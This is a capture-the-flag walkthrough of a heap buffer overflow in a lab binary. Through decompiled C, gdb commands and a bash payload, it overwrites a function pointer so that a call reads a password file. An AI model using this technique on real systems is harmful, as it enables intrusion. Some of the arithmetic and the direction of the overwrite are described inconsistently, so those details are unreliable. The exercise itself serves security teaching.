# Walkthrough

## Reversing

```c
void main(int argc,char **argv)
{
  char *__dest;
  code **ppcVar1;

  __dest = (char *)malloc(64);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,argv[1]);
  (**ppcVar1)();
  return;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  puts("Nope");
  return;
}

void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}
```

Okey, another easy one, `strcpy` is well knonw to be unsafe, it is susceptible
to buffer overflow.

Why you ask? Well, because looking at its prototype
`char *strcpy(char *dest, const char *src)` we can see that there is no actual
check for bounds and if the source is bigger than the destination then the
remaining bytes will overflow in the memory and will possibly override
important areas of memory (which is exactly what we’re going to do).

## Exploit

But how do we exploit this? Well, this binary is ratter interesting, it
executes the malloc in a certain interesting order, so `ppcVar1` will be
just behind `__dest`, so if we overflow `ppcVar1`, we can overwrite `__dest`,
let's make sure this is true with gdb:
```bash
gdb ./level6
b *main+21
b *main+37
r
p/x $eax
c
p/x $eax
```

This are the heap addresses returned by the mallocs (ir order):
```raw
0x0804a008
0x0804a050
```

A quick substract show us that indeed, the second malloc is just after the
first malloc (which has a size of 64 bytes):
```bash
echo 'ibase=16;804A050-804A008' | bc
72
```

The 12 additional bytes are probably the `malloc_chunk` struct of `libc`, we
should not overwrite that, of course, but who cares, we are exploiting a
binary.

So, our `argv[1]` should be something in the lines of:
- `64` + `12` offset bytes.
- `08048454` address of `n`, to overwrite `ppcVar1`.

Let's try:
```bash
offset=$(printf "%72s" " " | tr ' ' 'A')
address='08048454'
address=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})
payload="${offset}${address}"

./level6 "${payload}"
```

Of course I also created an script in `./resources/exploit.sh`.

And... Boom! Flag obtained! `\(^o^)/`
